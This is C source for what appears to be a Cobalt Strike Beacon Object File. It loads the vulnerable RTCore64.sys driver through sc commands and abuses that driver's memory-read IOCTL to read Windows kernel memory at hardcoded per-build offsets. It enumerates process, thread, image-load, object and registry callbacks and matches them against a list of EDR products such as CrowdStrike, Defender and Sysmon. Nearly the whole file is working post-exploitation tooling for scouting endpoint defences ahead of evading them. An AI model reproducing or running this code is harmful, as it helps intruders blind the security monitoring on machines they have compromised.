/*
 * Uso: list_callbacks
 *
 * Requiere RTCore64.sys:
 *   sc create RTCore64 type= kernel binPath= C:\Windows\System32\drivers\RTCore64.sys start= demand
 *   sc start RTCore64
 */

#include <windows.h>
#include "beacon.h"



#define RTCORE64_MEMORY_READ_IOCTL  0x80002048
#define RTCORE64_MEMORY_WRITE_IOCTL 0x8000204c
#define RTCORE64_DEVICE_NAME        "\\\\.\\RTCore64"

typedef struct {
    BYTE    Pad0[8];
    DWORD64 Address;
    BYTE    Pad1[8];
    DWORD   ReadSize;
    DWORD   Value;
    BYTE    Pad3[16];
} RTCORE64_MEMORY;

typedef struct {
    DWORD   build;
    DWORD   revision;
    DWORD64 PspCreateProcessNotifyRoutine;
    DWORD64 PspCreateThreadNotifyRoutine;
    DWORD64 PspLoadImageNotifyRoutine;
    DWORD64 PspCreateProcessNotifyRoutineCount;
    DWORD64 PspCreateThreadNotifyRoutineCount;
    DWORD64 PspLoadImageNotifyRoutineCount;
    DWORD64 CallbackListHead;   /* LIST_ENTRY head for CmRegisterCallback    */
    DWORD64 PsProcessType;      /* POBJECT_TYPE* — for object callbacks    */
    DWORD64 PsThreadType;       /* POBJECT_TYPE* — for object callbacks    */
} KERNEL_OFFSETS;

static const KERNEL_OFFSETS g_offsets[] = {

    /* Aqui agregar los nuevos offsets ;) */

    /*
     * Build 26100
     * SHA256 : 54f57116bcbbe96da72088130a8f949e13884a3db39d81f4b80cb26a88de00ac
     * PDB    : ntkrnlmp.pdb / 0000000614A4A1C4BC88E96D308B5D3D164723061
     */
    {
        26100,
        7824,
        0x00F05040,  /* PspCreateProcessNotifyRoutine      */
        0x00F05440,  /* PspCreateThreadNotifyRoutine       */
        0x00F05240,  /* PspLoadImageNotifyRoutine          */
        0x00FD8E0C,  /* PspCreateProcessNotifyRoutineCount */
        0x00FD8E04,  /* PspCreateThreadNotifyRoutineCount  */
        0x00FD8DFC,  /* PspLoadImageNotifyRoutineCount     */
        0x00EF76E0,  /* CallbackListHead                   */
        0x00FC5A98,  /* PsProcessType                      */
        0x00FC5AD0,  /* PsThreadType                       */
    },


    /*
     * Build 22621.6630
     * SHA256 : f1e5edf5175327d22c10eb2248456070b46b78db5dfdbc665d3b30fd570eefee
     * PDB    : ntkrnlmp.pdb / 0000000592612D4E4B981AADC80FD80C3446489146
     */
    {
        22621,
        6630,
        0x00D0C940,  /* PspCreateProcessNotifyRoutine      */
        0x00D0C740,  /* PspCreateThreadNotifyRoutine       */
        0x00D0C540,  /* PspLoadImageNotifyRoutine          */
        0x00D54D1C,  /* PspCreateProcessNotifyRoutineCount */
        0x00D54D20,  /* PspCreateThreadNotifyRoutineCount  */
        0x00D54D28,  /* PspLoadImageNotifyRoutineCount     */
        0x00C14820,  /* CallbackListHead                   */
        0x00D1EA58,  /* PsProcessType                      */
        0x00D1EA80,  /* PsThreadType                       */
    },


    /*
     * Build 19041.6456
     * SHA256 : 563f486f45853248e54b3ee800d6b19289101c6cca15e0e3fa11a70452b5ce91
     * PDB    : ntkrnlmp.pdb / 00000005740BF57E8E085650E8AF07723948662001
     */
    {
        19041,
        6456,
        0x00CEC7E0,  /* PspCreateProcessNotifyRoutine      */
        0x00CEC5E0,  /* PspCreateThreadNotifyRoutine       */
        0x00CEC3E0,  /* PspLoadImageNotifyRoutine          */
        0x00D2E9D0,  /* PspCreateProcessNotifyRoutineCount */
        0x00D2E9D8,  /* PspCreateThreadNotifyRoutineCount  */
        0x00D2E9DC,  /* PspLoadImageNotifyRoutineCount     */
        0x00C48590,  /* CallbackListHead                   */
        0x00CFC410,  /* PsProcessType                      */
        0x00CFC440,  /* PsThreadType                       */
    },

    /*
     * Build 20348.587
     * SHA256 : 5669b9b8bfcf20f08b7d1d65dc2deccbf836279c0e3f66722d72ad33ee7f672a
     * PDB    : ntkrnlmp.pdb / 00000005A9AFD801FBC06177380800F73929891592
     */
    {
        20348,
        587,
        0x00CFFC00,  /* PspCreateProcessNotifyRoutine      */
        0x00CFFE00,  /* PspCreateThreadNotifyRoutine       */
        0x00D00000,  /* PspLoadImageNotifyRoutine          */
        0x00D476D8,  /* PspCreateProcessNotifyRoutineCount */
        0x00D476D0,  /* PspCreateThreadNotifyRoutineCount  */
        0x00D476CC,  /* PspLoadImageNotifyRoutineCount     */
        0x00C539A0,  /* CallbackListHead                   */
        0x00D107D0,  /* PsProcessType                      */
        0x00D10800,  /* PsThreadType                       */
    },

    {
        26100,
        7920,
        0x00F05520,  /* PspCreateProcessNotifyRoutine      */
        0x00F05320,  /* PspCreateThreadNotifyRoutine       */
        0x00F05120,  /* PspLoadImageNotifyRoutine          */
        0x00FD8E0C,  /* PspCreateProcessNotifyRoutineCount */
        0x00FD8E04,  /* PspCreateThreadNotifyRoutineCount  */
        0x00FD8DFC,  /* PspLoadImageNotifyRoutineCount     */
        0x00EF77D0,  /* CallbackListHead                   */
        0x00FC5A98,  /* PsProcessType                      */
        0x00FC5AC8,  /* PsThreadType                       */
    },



};

#define NUM_OFFSETS (sizeof(g_offsets) / sizeof(g_offsets[0]))


DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$DeviceIoControl(HANDLE, DWORD, LPVOID, DWORD,
                                                         LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
                                                      DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

DECLSPEC_IMPORT BOOL    WINAPI PSAPI$EnumDeviceDrivers(LPVOID*, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD   WINAPI PSAPI$GetDeviceDriverBaseNameA(LPVOID, LPSTR, DWORD);

DECLSPEC_IMPORT DWORD   WINAPI VERSION$GetFileVersionInfoSizeA(LPCSTR, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI VERSION$GetFileVersionInfoA(LPCSTR, DWORD, DWORD, LPVOID);
DECLSPEC_IMPORT BOOL    WINAPI VERSION$VerQueryValueA(LPCVOID, LPCSTR, LPVOID*, PUINT);



#define SystemModuleInformation 11


typedef struct {
    HANDLE Section;            /* +0   8 bytes */
    PVOID  MappedBase;         /* +8   8 bytes */
    PVOID  ImageBase;          /* +16  8 bytes */
    ULONG  ImageSize;          /* +24  4 bytes */
    ULONG  Flags;              /* +28  4 bytes */
    USHORT LoadOrderIndex;     /* +32  2 bytes */
    USHORT InitOrderIndex;     /* +34  2 bytes */
    USHORT LoadCount;          /* +36  2 bytes */
    USHORT ModuleNameOffset;   /* +38  2 bytes */
    CHAR   FullPathName[256];  /* +40  256 bytes */
} SYSTEM_MODULE, *PSYSTEM_MODULE;  /* total: 296 bytes */

typedef struct {
    ULONG         ModulesCount;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

static DWORD64 rtcore_read64(HANDLE hDriver, DWORD64 address)
{
    RTCORE64_MEMORY mem = {0};
    DWORD returned = 0;

    mem.Address  = address;
    mem.ReadSize = 4;
    KERNEL32$DeviceIoControl(hDriver, RTCORE64_MEMORY_READ_IOCTL,
                              &mem, sizeof(mem), &mem, sizeof(mem), &returned, NULL);
    DWORD64 lo = mem.Value;

    mem.Address  = address + 4;
    mem.ReadSize = 4;
    mem.Value    = 0;
    KERNEL32$DeviceIoControl(hDriver, RTCORE64_MEMORY_READ_IOCTL,
                              &mem, sizeof(mem), &mem, sizeof(mem), &returned, NULL);
    DWORD64 hi = mem.Value;

    return lo | (hi << 32);
}

static DWORD rtcore_read32(HANDLE hDriver, DWORD64 address)
{
    RTCORE64_MEMORY mem = {0};
    DWORD returned = 0;

    mem.Address  = address;
    mem.ReadSize = 4;
    KERNEL32$DeviceIoControl(hDriver, RTCORE64_MEMORY_READ_IOCTL,
                              &mem, sizeof(mem), &mem, sizeof(mem), &returned, NULL);
    return mem.Value;
}

#define MOD_BUF_SIZE (1024 * 1024)

static SYSTEM_MODULE_INFORMATION* alloc_module_list(void)
{
    PVOID buf = KERNEL32$VirtualAlloc(NULL, MOD_BUF_SIZE,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return NULL;
    ULONG needed = 0;
    NTSTATUS st = NTDLL$NtQuerySystemInformation(SystemModuleInformation,
                                                  buf, MOD_BUF_SIZE, &needed);
    if (st != 0) {
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        return NULL;
    }
    return (SYSTEM_MODULE_INFORMATION*)buf;
}

static const char* resolve_driver(SYSTEM_MODULE_INFORMATION* info, DWORD64 ptr)
{
    for (ULONG i = 0; i < info->ModulesCount; i++) {
        SYSTEM_MODULE* m = &info->Modules[i];
        DWORD64 base = (DWORD64)m->ImageBase;
        if (ptr >= base && ptr < base + m->ImageSize) {
            return m->FullPathName + m->ModuleNameOffset;
        }
    }
    return "unknown";
}

static int ci_eq(const char* a, const char* b);

#define MAX_DRIVERS 512

static DWORD64 get_kernel_base(SYSTEM_MODULE_INFORMATION* info)
{
    static LPVOID drivers[MAX_DRIVERS];
    DWORD  needed = 0;

    if (PSAPI$EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        char name[64];
        DWORD count = needed / sizeof(LPVOID);
        for (DWORD i = 0; i < count; i++) {
            name[0] = '\0';
            PSAPI$GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name));

            if ((name[0]=='n'||name[0]=='N') && (name[1]=='t'||name[1]=='T') &&
                ((name[2]=='o'||name[2]=='O') || (name[2]=='k'||name[2]=='K')))
                return (DWORD64)drivers[i];
        }
    }

    if (!info || info->ModulesCount == 0) return 0;
    for (ULONG i = 0; i < info->ModulesCount; i++) {
        const char* name = info->Modules[i].FullPathName +
                           info->Modules[i].ModuleNameOffset;
        if ((name[0]=='n'||name[0]=='N') && (name[1]=='t'||name[1]=='T') &&
            ((name[2]=='o'||name[2]=='O') || (name[2]=='k'||name[2]=='K')))
            return (DWORD64)info->Modules[i].ImageBase;
    }
    return (DWORD64)info->Modules[0].ImageBase;
}

static void patch_module_bases(SYSTEM_MODULE_INFORMATION* info)
{
    static LPVOID drivers[MAX_DRIVERS];
    DWORD  needed = 0;

    if (!PSAPI$EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) return;

    DWORD count = needed / sizeof(LPVOID);

    for (ULONG i = 0; i < info->ModulesCount; i++) {
        if ((DWORD64)info->Modules[i].ImageBase != 0) continue; /* already valid */

        const char* modname = info->Modules[i].FullPathName +
                              info->Modules[i].ModuleNameOffset;

        char drvname[64];
        for (DWORD d = 0; d < count; d++) {
            drvname[0] = '\0';
            PSAPI$GetDeviceDriverBaseNameA(drivers[d], drvname, sizeof(drvname));
            if (ci_eq(modname, drvname)) {
                info->Modules[i].ImageBase = drivers[d];
                break;
            }
        }
    }
}

// ************************************************************************************************

static void get_ntoskrnl_version(DWORD* build, DWORD* revision)
{
    DWORD handle = 0;

    DWORD size = VERSION$GetFileVersionInfoSizeA(
        "C:\\Windows\\System32\\ntoskrnl.exe",
        &handle
    );

    if (!size) {
        *build = 0;
        *revision = 0;
        return;
    }

    char* buffer = KERNEL32$VirtualAlloc(
        NULL,
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!buffer) {
        *build = 0;
        *revision = 0;
        return;
    }

    VERSION$GetFileVersionInfoA(
        "C:\\Windows\\System32\\ntoskrnl.exe",
        handle,
        size,
        buffer
    );

    VS_FIXEDFILEINFO* ver = NULL;
    UINT len = 0;

    VERSION$VerQueryValueA(
        buffer,
        "\\",
        (LPVOID*)&ver,
        &len
    );

    *build = HIWORD(ver->dwFileVersionLS);
    *revision = LOWORD(ver->dwFileVersionLS);

    KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
}

// ************************************************************************************************



static const KERNEL_OFFSETS* find_offsets(DWORD build, DWORD revision)
{
    for (SIZE_T i = 0; i < NUM_OFFSETS; i++) {
        if (g_offsets[i].build == build && g_offsets[i].revision == revision)
            return &g_offsets[i];
    }
    return NULL;
}

typedef struct {
    const char* driver;
    const char* product;
} DRIVER_PRODUCT;

static const DRIVER_PRODUCT g_products[] = {

    /* ── Microsoft Defender / Windows built-ins ── */
    { "WdFilter.sys",           "Defender"           },
    { "WdNisDrv.sys",           "Defender NIS"       },
    { "WdBoot.sys",             "Defender Boot"      },
    { "MpKsl",                  "Defender"           }, /* MpKslxxxxxxxx.sys */
    { "wdswap.sys",             "Defender"           },

    /* ── Windows kernel / telemetry ── */
    { "ntoskrnl.exe",           "Windows Kernel"     },
    { "ksecdd.sys",             "Windows KSecDD"     },
    { "cng.sys",                "Windows CNG"        },
    { "CI.dll",                 "Windows CI"         },
    { "peauth.sys",             "Windows PEAuth"     },

    /* ── Sysmon ── */
    { "SysmonDrv.sys",          "Sysmon"             },
    { "Sysmon.sys",             "Sysmon"             },
    { "Sysmon64.sys",           "Sysmon"             },

    /* ── CrowdStrike ── */
    { "csagent.sys",            "CrowdStrike"        },
    { "csdevicecontrol.sys",    "CrowdStrike"        },
    { "cshid.sys",              "CrowdStrike"        },

    /* ── SentinelOne ── */
    { "SentinelMonitor.sys",    "SentinelOne"        },

    /* ── Carbon Black ── */
    { "cbk7.sys",               "Carbon Black"       },
    { "cbstream.sys",           "Carbon Black"       },
    { "cbdriverXXX.sys",        "Carbon Black"       },

    /* ── Cylance ── */
    { "CylanceDrv.sys",         "Cylance"            },
    { "CylanceMemDef.sys",      "Cylance"            },

    /* ── Symantec / Broadcom ── */
    { "BHDrvx64.sys",           "Symantec"           },
    { "ccSetx64.sys",           "Symantec"           },
    { "SRTSP64.SYS",            "Symantec"           },
    { "eeCtrl64.sys",           "Symantec"           },
    { "eraser.sys",             "Symantec"           },

    /* ── McAfee / Trellix ── */
    { "mfeaskm.sys",            "Trellix/McAfee"     },
    { "mfencfilter.sys",        "Trellix/McAfee"     },
    { "mfehidk.sys",            "Trellix/McAfee"     },
    { "mfewfpk.sys",            "Trellix/McAfee"     },

    /* ── Trend Micro ── */
    { "tmcomm.sys",             "Trend Micro"        },
    { "tmactmon.sys",           "Trend Micro"        },
    { "TMEBC64.sys",            "Trend Micro"        },
    { "tmevtmgr.sys",           "Trend Micro"        },

    /* ── ESET ── */
    { "eamonm.sys",             "ESET"               },
    { "ehdrv.sys",              "ESET"               },
    { "epfw.sys",               "ESET"               },
    { "ekbdflt.sys",            "ESET"               },

    /* ── Kaspersky ── */
    { "klif.sys",               "Kaspersky"          },
    { "klhk.sys",               "Kaspersky"          },
    { "klflt.sys",              "Kaspersky"          },
    { "kl1.sys",                "Kaspersky"          },

    /* ── Sophos ── */
    { "SophosED.sys",           "Sophos"             },
    { "SAVOnAccess.sys",        "Sophos"             },
    { "hmpalert.sys",           "HitmanPro/Sophos"   },

    /* ── Palo Alto / Cortex ── */
    { "cyverak.sys",            "Cortex XDR"         },
    { "cyvrmtgn.sys",           "Cortex XDR"         },
    { "cyvera.sys",             "Cortex XDR"         },
    { "traps.sys",              "Cortex XDR"         },

    /* ── Elastic ── */
    { "ElasticEndgame.sys",     "Elastic"            },

    /* ── Bitdefender ── */
    { "BDSandBox.sys",          "Bitdefender"        },
    { "bdselfpr.sys",           "Bitdefender"        },
    { "gzflt.sys",              "Bitdefender"        },
    { "bddevflt.sys",           "Bitdefender"        },

    /* ── Malwarebytes ── */
    { "MBAMSwissArmy.sys",      "Malwarebytes"       },
    { "mbamchameleon.sys",      "Malwarebytes"       },

    /* ── Cybereason ── */
    { "CRExecPrev.sys",         "Cybereason"         },

    /* ── Deep Instinct ── */
    { "DeepInsightDrv.sys",     "Deep Instinct"      },

    /* ── VMware / VirtualBox (lab) ── */
    { "VBoxSup.sys",            "VirtualBox"         },
    { "VBoxDrv.sys",            "VirtualBox"         },
    { "vmci.sys",               "VMware"             },
    { "vsepflt.sys",            "VMware Carbon Black"},
    { "VGAuth.sys",             "VMware"             },

    /* ── Process Monitor / Sysinternals ── */
    { "PROCMON24.SYS",          "ProcMon"            },
    { "procmon.sys",            "ProcMon"            },

};

#define NUM_PRODUCTS (sizeof(g_products) / sizeof(g_products[0]))

static int ci_eq(const char* a, const char* b)
{
    while (*a && *b) {
        char ca = (*a >= 'A' && *a <= 'Z') ? *a + 32 : *a;
        char cb = (*b >= 'A' && *b <= 'Z') ? *b + 32 : *b;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == *b;
}


static int bof_strlen(const char* s)
{
    int n = 0;
    while (s[n]) n++;
    return n;
}

static int ci_suffix(const char* haystack, const char* needle)
{
    int hlen = bof_strlen(haystack);
    int nlen = bof_strlen(needle);
    if (nlen > hlen) return 0;
    return ci_eq(haystack + hlen - nlen, needle);
}

static const char* lookup_product(const char* driver_name)
{
    for (int i = 0; i < (int)NUM_PRODUCTS; i++) {
        if (ci_suffix(driver_name, g_products[i].driver))
            return g_products[i].product;
    }
    return "";
}



#define MAX_CALLBACKS  64
#define MAX_DRV_ROWS   96
#define DRV_NAME_LEN   48
#define PROD_NAME_LEN  24

#define COL_PROC        0
#define COL_THREAD      1
#define COL_IMAGE       2
#define COL_PROC_HDL    3
#define COL_THR_HDL     4
#define COL_REGISTRY    5
#define NUM_COLS        6

typedef struct {
    char name[DRV_NAME_LEN];
    char product[PROD_NAME_LEN];
    BOOL cols[NUM_COLS];
} DRV_ROW;

static DRV_ROW g_rows[MAX_DRV_ROWS];
static int     g_nrows = 0;

static void table_reset(void)
{
    g_nrows = 0;
    for (int i = 0; i < MAX_DRV_ROWS; i++) {
        g_rows[i].name[0]    = '\0';
        g_rows[i].product[0] = '\0';
        for (int c = 0; c < NUM_COLS; c++)
            g_rows[i].cols[c] = FALSE;
    }
}

static int table_row(const char* name)
{
    for (int i = 0; i < g_nrows; i++) {
        const char* a = g_rows[i].name;
        const char* b = name;
        while (*a && *a == *b) { a++; b++; }
        if (*a == *b) return i;
    }
    if (g_nrows >= MAX_DRV_ROWS) return -1;
    int idx = g_nrows++;

    int j = 0;
    while (j < DRV_NAME_LEN - 1 && name[j]) {
        g_rows[idx].name[j] = name[j];
        j++;
    }
    g_rows[idx].name[j] = '\0';

    const char* prod = lookup_product(name);
    j = 0;
    while (j < PROD_NAME_LEN - 1 && prod[j]) {
        g_rows[idx].product[j] = prod[j];
        j++;
    }
    g_rows[idx].product[j] = '\0';

    for (int c = 0; c < NUM_COLS; c++)
        g_rows[idx].cols[c] = FALSE;
    return idx;
}

static void collect_notify(HANDLE hDriver,
                            SYSTEM_MODULE_INFORMATION* modinfo,
                            DWORD64 array_va,
                            int     col)
{

    for (DWORD i = 0; i < MAX_CALLBACKS; i++) {
        DWORD64 slot = rtcore_read64(hDriver, array_va + i * 8);
        if (!slot || !(slot & 1)) continue;

        DWORD64 block = slot & ~(DWORD64)0xf;
        DWORD64 fn    = rtcore_read64(hDriver, block + 8);
        const char* drv = resolve_driver(modinfo, fn);

        int idx = table_row(drv);
        if (idx >= 0) g_rows[idx].cols[col] = TRUE;
    }
}

#define OB_ENTRY_ENABLED_OFF 20
#define OB_ENTRY_PRE_OFF     32
#define OB_ENTRY_POST_OFF    40
#define OB_CALLBACK_LIST_OFF 0xC8

static void collect_object_callbacks(HANDLE hDriver,
                                      SYSTEM_MODULE_INFORMATION* modinfo,
                                      DWORD64 list_head_va,
                                      int col)
{
    DWORD64 flink = rtcore_read64(hDriver, list_head_va);
    int count = 0;

    while (flink != list_head_va && flink != 0 && count < 32) {
        BYTE enabled = (BYTE)(rtcore_read32(hDriver, flink + OB_ENTRY_ENABLED_OFF) & 0xFF);
        if (enabled) {
            DWORD64 pre  = rtcore_read64(hDriver, flink + OB_ENTRY_PRE_OFF);
            DWORD64 post = rtcore_read64(hDriver, flink + OB_ENTRY_POST_OFF);

            DWORD64 fn = pre ? pre : post;
            if (fn) {
                const char* drv = resolve_driver(modinfo, fn);
                if (!(drv[0]=='u' && drv[1]=='n' &&
                      drv[2]=='k' && drv[3]=='n')) {
                    int idx = table_row(drv);
                    if (idx >= 0) g_rows[idx].cols[col] = TRUE;
                }
            }
        }
        flink = rtcore_read64(hDriver, flink);
        count++;
    }
}

static DWORD64 probe_cm_fn_offset(HANDLE hDriver,
                                   SYSTEM_MODULE_INFORMATION* modinfo,
                                   DWORD64 first_entry)
{
    DWORD probes[] = {32, 40, 48, 56, 64};
    for (int i = 0; i < 5; i++) {
        DWORD64 candidate = rtcore_read64(hDriver, first_entry + probes[i]);
        if (!candidate) continue;
        const char* drv = resolve_driver(modinfo, candidate);
        if (drv[0] != 'u') /* not "unknown" — found a valid module pointer */
            return probes[i];
    }
    return 48;
}

static void collect_registry(HANDLE hDriver,
                              SYSTEM_MODULE_INFORMATION* modinfo,
                              DWORD64 list_head_va)
{
    if (!list_head_va) return;

    DWORD64 flink = rtcore_read64(hDriver, list_head_va);
    if (flink == list_head_va || flink == 0) return;

    DWORD64 fn_off = probe_cm_fn_offset(hDriver, modinfo, flink);

    int count = 0;
    DWORD64 entry = flink;
    while (entry != list_head_va && entry != 0 && count < 64) {
        DWORD64 fn = rtcore_read64(hDriver, entry + fn_off);
        if (fn) {
            const char* drv = resolve_driver(modinfo, fn);
            if (!(drv[0]=='u' && drv[1]=='n' &&
                  drv[2]=='k' && drv[3]=='n')) {
                int idx = table_row(drv);
                if (idx >= 0) g_rows[idx].cols[COL_REGISTRY] = TRUE;
            }
        }
        entry = rtcore_read64(hDriver, entry); /* flink */
        count++;
    }
}



#define COL_YES  "  yes  "
#define COL_NO   "   -   "
#define COL_W    7   /* width of each yes/no cell */

static void print_table(void)
{
    BeaconPrintf(CALLBACK_OUTPUT,
        "\r\n"
        "%-32s  %-20s  %-7s  %-7s  %-9s  %-10s  %-13s  %-8s\r\n",
        "Driver", "Product",
        "Process", "Thread", "ImageLoad", "ProcHandle", "ThreadHandle", "Registry");

    BeaconPrintf(CALLBACK_OUTPUT,
        "%-32s  %-20s  %-7s  %-7s  %-9s  %-10s  %-13s  %-8s\r\n",
        "--------------------------------", "--------------------",
        "-------", "-------", "---------", "----------", "-------------", "--------");

    for (int i = 0; i < g_nrows; i++) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "%-32s  %-20s  %-7s  %-7s  %-9s  %-10s  %-13s  %-8s\r\n",
            g_rows[i].name,
            g_rows[i].product,
            g_rows[i].cols[COL_PROC]     ? "yes" : "-",
            g_rows[i].cols[COL_THREAD]   ? "yes" : "-",
            g_rows[i].cols[COL_IMAGE]    ? "yes" : "-",
            g_rows[i].cols[COL_PROC_HDL] ? "yes" : "-",
            g_rows[i].cols[COL_THR_HDL]  ? "yes" : "-",
            g_rows[i].cols[COL_REGISTRY] ? "yes" : "-");
    }
}

void go(char* args, int len)
{

    DWORD build, revision;
    get_ntoskrnl_version(&build, &revision);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] ntoskrnl version: 10.0.%lu.%lu\r\n", build, revision);


    const KERNEL_OFFSETS* off = find_offsets(build, revision);
    if (!off) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] No hardcoded offsets for build %lu.%lu.\r\n"
            "    Add the entry to g_offsets[] using extract_offsets.py.\r\n",
            build, revision);
        return;
    }

    SYSTEM_MODULE_INFORMATION* modinfo = alloc_module_list();
    if (!modinfo) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to query module list\r\n");
        return;
    }

    patch_module_bases(modinfo);

    DWORD64 kbase = get_kernel_base(modinfo);
    if (!kbase) {
        KERNEL32$VirtualFree(modinfo, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_OUTPUT, "[-] ntoskrnl base not found\r\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] ntoskrnl base: 0x%llX\r\n", kbase);

    DWORD64 va_proc          = kbase + off->PspCreateProcessNotifyRoutine;
    DWORD64 va_thread        = kbase + off->PspCreateThreadNotifyRoutine;
    DWORD64 va_image         = kbase + off->PspLoadImageNotifyRoutine;
    DWORD64 va_cnt_proc      = kbase + off->PspCreateProcessNotifyRoutineCount;
    DWORD64 va_cnt_thread    = kbase + off->PspCreateThreadNotifyRoutineCount;
    DWORD64 va_cnt_image     = kbase + off->PspLoadImageNotifyRoutineCount;
    DWORD64 va_psprocess     = kbase + off->PsProcessType;
    DWORD64 va_psthread      = kbase + off->PsThreadType;
    DWORD64 va_cblist        = off->CallbackListHead ? kbase + off->CallbackListHead : 0;

    HANDLE hDriver = KERNEL32$CreateFileA(
        RTCORE64_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        KERNEL32$VirtualFree(modinfo, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] Failed to open RTCore64 (error %lu)\r\n"
            "    Ensure RTCore64.sys is loaded: sc start RTCore64\r\n",
            KERNEL32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] RTCore64 device opened\r\n");

    DWORD cnt_proc   = rtcore_read32(hDriver, va_cnt_proc);
    DWORD cnt_thread = rtcore_read32(hDriver, va_cnt_thread);
    DWORD cnt_image  = rtcore_read32(hDriver, va_cnt_image);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Process: %lu  Thread: %lu  ImageLoad: %lu\r\n",
        cnt_proc, cnt_thread, cnt_image);

    table_reset();

    collect_notify(hDriver, modinfo, va_proc,   COL_PROC);
    collect_notify(hDriver, modinfo, va_thread, COL_THREAD);
    collect_notify(hDriver, modinfo, va_image,  COL_IMAGE);

    DWORD64 proc_type_ptr   = rtcore_read64(hDriver, va_psprocess);
    DWORD64 thread_type_ptr = rtcore_read64(hDriver, va_psthread);

    collect_object_callbacks(hDriver, modinfo,
        proc_type_ptr   + OB_CALLBACK_LIST_OFF, COL_PROC_HDL);
    collect_object_callbacks(hDriver, modinfo,
        thread_type_ptr + OB_CALLBACK_LIST_OFF, COL_THR_HDL);

    collect_registry(hDriver, modinfo, va_cblist);

    print_table();

    KERNEL32$CloseHandle(hDriver);
    KERNEL32$VirtualFree(modinfo, 0, MEM_RELEASE);
    BeaconPrintf(CALLBACK_OUTPUT, "\r\n[+] Done\r\n");
}
